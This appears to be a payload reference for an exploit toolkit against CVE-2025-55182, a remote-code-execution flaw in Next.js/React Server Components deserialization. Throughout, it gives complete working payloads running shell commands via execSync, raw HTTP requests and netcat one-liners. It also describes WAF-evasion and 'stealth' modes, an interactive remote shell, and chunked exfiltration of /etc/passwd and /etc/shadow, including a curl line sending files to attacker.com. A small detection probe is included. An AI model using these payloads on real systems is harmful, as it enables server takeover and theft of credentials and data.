# CVE-2025-55182 Payload Reference

Quick reference for exploit payloads and HTTP request formats.

---

## Quick Usage

```bash
# Detection
./detect.sh http://localhost:3443

# RCE with stdout (recommended)
./exploit-redirect.sh http://localhost:3443 "id"
./exploit-redirect.sh http://localhost:3443 "cat /etc/passwd"

# Interactive shell
./shell.sh http://localhost:3443
# Supports: cd, download <file>, help, exit, !local_cmd

# File exfiltration (auto-chunking for large files)
./exfil-file.sh http://localhost:3443 /etc/passwd
./exfil-file.sh http://localhost:3443 /etc/passwd ./local_copy.txt

# Action ID discovery (needed for urlencoded/reflect modes)
./enumerate-actions.sh http://localhost:3443

# Alternative modes
./exploit-throw.sh http://localhost:3443 "id"              # Dev mode only
./exploit-blind.sh http://localhost:3443 "touch /tmp/pwn"  # Fire-and-forget
./exploit-urlencoded.sh http://localhost:3443 "ACTION_ID" "id"  # WAF evasion
./exploit-reflect.sh http://localhost:3443 "ACTION_ID" "id"     # HTTP 200 stealth
```

---

## Exploit Scripts Summary

| Script | stdout | HTTP | Action ID | Production | Use Case |
|--------|--------|------|-----------|------------|----------|
| `exploit-redirect.sh` | Header (`x-action-redirect`) | 303 | No | **Works** | **Recommended** - data exfil |
| `exploit-throw.sh` | Body (`message` field) | 500 | No | Broken | Dev/testing only |
| `exploit-blind.sh` | Server-side only | 200 (hangs) | No | **Works** | Fire-and-forget, OOB exfil |
| `exploit-urlencoded.sh` | Header (`x-action-redirect`) | 303 | **Yes** | **Works** | WAF evasion |
| `exploit-reflect.sh` | Body (RSC response) | 200 | **Yes** | **Works** | Maximum stealth |

### Helper Tools

| Script | Purpose | Notes |
|--------|---------|-------|
| `shell.sh` | Interactive shell | REPL with cd tracking, file download, readline history |
| `exfil-file.sh` | File exfiltration | Auto-chunks large files, reassembles locally |
| `enumerate-actions.sh` | Action ID discovery | Scrapes HTML for server action IDs |
| `detect.sh` | Vulnerability probe | Non-destructive detection (Searchlight method) |
| `test-size-limit.sh` | Size limit testing | Test header size limits on target |

---

## Core Payload Structure

All exploit modes share this JSON structure in Part 0:

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix": "<JAVASCRIPT_CODE>",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

**Field purposes:**
| Field | Purpose | Value |
|-------|---------|-------|
| `then` | Hijacks Chunk.prototype.then | `$1:__proto__:then` |
| `status` | Triggers initializeModelChunk() | `resolved_model` |
| `reason` | Bypasses toString() at line 453 | `-1` |
| `value` | Inner JSON with blob reference | `{"then":"$B0"}` |
| `_response._prefix` | Attacker code string | JavaScript to execute |
| `_response._formData.get` | Function constructor ref | `$1:constructor:constructor` |

---

## JavaScript Payloads by Mode

### Blind Mode (fire-and-forget)
```javascript
process.mainModule.require('child_process').execSync('CMD');0
```
- Command executes, Promise never settles, connection hangs
- Output appears in server terminal only

### Throw Mode (HTTP 500, dev only)
```javascript
throw process.mainModule.require('child_process').execSync('CMD').toString();
```
- Output in `message` field of error JSON
- **Broken in production** (error messages sanitized)

### Redirect Mode (HTTP 303, recommended)
```javascript
var o=Buffer.from(process.mainModule.require('child_process').execSync('CMD')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;
```
- Output in `x-action-redirect` header as `http://x/{base64};push`
- **Works in production** (digest not sanitized)

### Reflect Mode (HTTP 200, stealth)
```javascript
arguments[0]([process.mainModule.require('child_process').execSync('CMD').toString()]);
```
- Output in RSC response body
- Requires valid action ID + echo-style action
- **Works in production**

---

## Multipart Payload (Default)

### Raw HTTP Request (Redirect Mode)

```http
POST / HTTP/1.1
Host: localhost:3443
User-Agent: Mozilla/5.0
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: <calculated>

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"var o=Buffer.from(process.mainModule.require('child_process').execSync('id')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

### Netcat One-liner (Redirect Mode)

```bash
(printf 'POST / HTTP/1.1\r\nHost: localhost:3443\r\nUser-Agent: Mozilla/5.0\r\nNext-Action: x\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Length: 390\r\n\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"var o=Buffer.from(process.mainModule.require('\''child_process'\'').execSync('\''id'\'').toString('\''base64'\''));var e=new Error();e.digest='\''NEXT_REDIRECT;push;http://x/'\''+o+'\'';307;'\'';throw e;","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n' | nc localhost 3443)
```

### Netcat One-liner (Blind Mode)

```bash
(printf 'POST / HTTP/1.1\r\nHost: localhost:3443\r\nUser-Agent: Mozilla/5.0\r\nNext-Action: x\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Length: 477\r\n\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"process.mainModule.require('\''child_process'\'').execSync('\''touch /tmp/pwned'\'');0","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n' | nc localhost 3443 &) ; sleep 1
```

---

## URL-Encoded Payload (WAF Evasion)

**Requires valid action ID** - use `enumerate-actions.sh` first.

### Raw HTTP Request

```http
POST / HTTP/1.1
Host: localhost:3443
User-Agent: Mozilla/5.0
Next-Action: <VALID_ACTION_ID>
Content-Type: application/x-www-form-urlencoded
Content-Length: <calculated>

0=%7B%22then%22%3A%22%241%3A__proto__%3Athen%22%2C%22status%22%3A%22resolved_model%22%2C%22reason%22%3A-1%2C%22value%22%3A%22%7B%5C%22then%5C%22%3A%5C%22%24B0%5C%22%7D%22%2C%22_response%22%3A%7B%22_prefix%22%3A%22<URL_ENCODED_JS>%22%2C%22_formData%22%3A%7B%22get%22%3A%22%241%3Aconstructor%3Aconstructor%22%7D%7D%7D&1=%22%24%400%22
```

### Key Difference from Multipart

| Aspect | Multipart | URL-Encoded |
|--------|-----------|-------------|
| Action ID required | **No** | **Yes** |
| Payload format | Complex boundaries | Simple key=value |
| WAF signature | Boundary patterns | URL encoding |
| Validation order | RCE before ID check | ID check before RCE |

**Why URL-encoded requires action ID:** Next.js validates the action ID at `action-handler.ts:768` BEFORE calling `decodeReply()`. Multipart triggers RCE during deserialization, before action validation.

---

## Action ID Discovery

Action IDs are **publicly exposed** in Next.js applications.

### From HTML Hidden Fields
```bash
curl -s https://target.com/ | grep -oE '\$ACTION_ID_[a-f0-9]+' | sort -u
```

### From RSC Flight Payload
```bash
curl -s https://target.com/ | grep -o '{"id":"[^"]*","bound":[^}]*}'
```

### Example Output (dev mode includes paths!)
```json
{"id":"00471125f2479dd5e24cd579742b6cc225ed4803b4","bound":null,"name":"action","env":"Server","location":["module evaluation","/app/actions.ts",70,452]}
```

### Action ID Format
- 40 hexadecimal characters
- Hash of action function + module path
- Changes when action code/location changes

---

## Output Extraction

### Redirect Mode (x-action-redirect header)
```bash
curl -s -D - http://target:3443 ... | grep "x-action-redirect" | \
  sed 's/.*http:\/\/x\///' | sed 's/;push.*//' | base64 -d
```

### Throw Mode (error body)
```bash
curl -s http://target:3443 ... | grep -o '"message":"[^"]*"' | \
  sed 's/"message":"//' | sed 's/"$//'
```

### Reflect Mode (RSC body)
Output appears directly in the RSC response as action return value.

---

## Output Size Limits

### Redirect Mode (Header Limits)

| Layer | Typical Limit | Notes |
|-------|---------------|-------|
| Node.js | 16KB total headers | `--max-http-header-size` |
| nginx | 4-8KB per header | `large_client_header_buffers` |
| AWS ALB | 16KB total headers | Not configurable |
| Cloudflare | 16KB total headers | Enterprise can increase |

**Conservative estimate:** ~6KB raw output after base64 decode.

### Workarounds for Large Output

**Chunking:**
```bash
./exploit-redirect.sh target "dd if=/etc/passwd bs=6000 count=1"
./exploit-redirect.sh target "dd if=/etc/passwd bs=6000 count=1 skip=1"
```

**Out-of-band:**
```bash
./exploit-blind.sh target "curl -X POST -d @/etc/passwd https://attacker.com/exfil"
```

### Reflect Mode
No practical limit - output is in response body (streaming).

---

## Production vs Development

### Error Behavior

| Mode | Dev | Production | Reason |
|------|-----|------------|--------|
| **Redirect** | Works | **Works** | URL in `digest` (not sanitized) |
| **Throw** | Works | **Broken** | `message` stripped to `{digest}` only |
| **Blind** | Works | **Works** | No output needed |
| **Reflect** | Works | **Works** | Normal model values (not errors) |

### Scenario Selection

| Target | Recommended | Why |
|--------|-------------|-----|
| Production, any | **Redirect** | No prerequisites, works everywhere |
| Development/testing | Throw | Cleaner output in body |
| Maximum stealth | Reflect | HTTP 200, looks like normal traffic |
| WAF blocking multipart | URL-encoded | Different signature |
| Fire-and-forget | Blind + OOB | Use `curl attacker.com` |

---

## Content-Length Reference

Content-Length must match the multipart body exactly (with CRLF line endings).

| Command | Approximate Length |
|---------|-------------------|
| `id` | ~450-460 bytes |
| `whoami` | ~455 bytes |
| `touch /tmp/test` | ~475 bytes |

**Tip:** Use the shell scripts which calculate Content-Length automatically.

---

## Flight Protocol Reference Types

| Prefix | Type | Example | Purpose |
|--------|------|---------|---------|
| `$1`, `$2` | Model reference | `$1:a:b` → `chunk1.a.b` | Reference chunk by ID |
| `$@0` | Raw chunk reference | `$@0` → chunk object | Get chunk object itself |
| `$B0` | Blob reference | `$B0` | Triggers `_formData.get(_prefix + "0")` |
| `$1:__proto__:then` | Path traversal | Prototype chain access | The vulnerability |

---

## Complete Payload Examples

### Part 0 JSON by Mode

**Blind:**
```json
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('CMD');0","_formData":{"get":"$1:constructor:constructor"}}}
```

**Throw:**
```json
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"throw process.mainModule.require('child_process').execSync('CMD').toString();","_formData":{"get":"$1:constructor:constructor"}}}
```

**Redirect:**
```json
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"var o=Buffer.from(process.mainModule.require('child_process').execSync('CMD')).toString('base64');var e=new Error();e.digest='NEXT_REDIRECT;push;http://x/'+o+';307;';throw e;","_formData":{"get":"$1:constructor:constructor"}}}
```

**Reflect:**
```json
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"arguments[0]([process.mainModule.require('child_process').execSync('CMD').toString()]);","_formData":{"get":"$1:constructor:constructor"}}}
```

### Part 1 (All Modes)
```
"$@0"
```

---

## Why It Hangs (Blind Mode)

The Promise thenable protocol:
1. `resolve({then: fn})` calls `fn(resolve, reject)`
2. Our function: `Function("execSync('CMD');0")`
3. Function executes command, returns `0`
4. **Never calls resolve() or reject()**
5. Promise stays PENDING forever
6. Server connection hangs

**Solutions:**
- Background with `&` (fire-and-forget)
- Use redirect/throw mode for output
- Timeout wrapper: `timeout 2 nc ...`

---

## Utility Script Usage

### exfil-file.sh - Chunked File Exfiltration

Automatically handles large file exfiltration with chunking and reassembly.

```bash
# Basic usage - output to stdout
./exfil-file.sh http://localhost:3443 /etc/passwd

# Save to local file
./exfil-file.sh http://localhost:3443 /etc/shadow ./shadow.txt

# Custom chunk size (default: 6000 bytes)
CHUNK_SIZE=4000 ./exfil-file.sh http://localhost:3443 /var/log/app.log ./app.log
```

**How it works:**
1. Tries quick single-request exfil first (`cat`)
2. If file too large, gets file size via `stat`
3. Chunks file with `dd` (6KB default)
4. Reassembles chunks locally
5. Retries failed chunks automatically

### shell.sh - Interactive Shell

Provides a pseudo-interactive shell experience over RCE.

```bash
./shell.sh http://localhost:3443
```

**Built-in commands:**
| Command | Description |
|---------|-------------|
| `help` | Show help |
| `exit`, `quit`, `q` | Exit shell |
| `cd <dir>` | Change directory (tracked across commands) |
| `download <file> [local]` | Download file using exfil-file.sh |
| `!<cmd>` | Run command locally |

**Features:**
- Tracks CWD across commands (prepends `cd` to each request)
- Readline history (saved to `~/.react2shell_history`)
- Color-coded prompt showing user@host:path
- Automatic target enumeration on connect (hostname, whoami, pwd)

**Example session:**
```
$ ./shell.sh http://localhost:3443
Connected!
  User: www-data
  Host: webserver
  CWD:  /var/www/app

www-data@webserver:/var/www/app$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@webserver:/var/www/app$ cd /etc
www-data@webserver:/etc$ cat passwd | head -5
root:x:0:0:root:/root:/bin/bash
...

www-data@webserver:/etc$ download passwd ./passwd.txt
[+] Saved to: passwd.txt

www-data@webserver:/etc$ exit
Goodbye!
```

### detect.sh - Vulnerability Detection

Non-destructive probe using Searchlight/Assetnote method.

```bash
./detect.sh http://target:3000
```

**Detection logic:**
- Sends `["$1:a:a"]` referencing empty object `{}`
- Vulnerable: `{}.a.a` → crash → HTTP 500 + `E{"digest"`
- Patched: `hasOwnProperty` check prevents crash

### enumerate-actions.sh - Action ID Discovery

Extracts server action IDs from target HTML.

```bash
./enumerate-actions.sh http://target:3000
```

Searches for:
- Hidden form fields: `$ACTION_ID_[a-f0-9]+`
- RSC Flight payload: `{"id":"...","bound":...}`
